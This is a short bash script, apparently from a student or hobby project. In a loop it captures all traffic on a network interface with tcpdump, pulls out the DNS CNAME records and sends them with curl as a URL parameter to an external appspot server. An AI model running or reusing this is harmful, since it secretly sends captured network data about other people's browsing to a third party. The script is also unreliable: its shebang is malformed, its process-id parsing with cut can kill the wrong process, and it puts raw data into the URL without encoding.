#!bin/bash

while true; do

        tcpdump -i en0 -s 0 -w ~/Desktop/DumpFile01.pcap &

        sleep 10

        ps=$(ps -ef | grep -i "tcpdump" | cut -d ' ' -f 6 | head -1);

        echo $ps

        kill -9 $ps

        data=$(tcpdump -r ~/Desktop/DumpFile01.pcap | grep CNAME);

        data=${data//$'\n'/+}

        data=${data// /+}

        url=http://1-dot-ninjabotscmu.appspot.com/ninjabotscmu?data=$data

        echo $url

        curl $url

done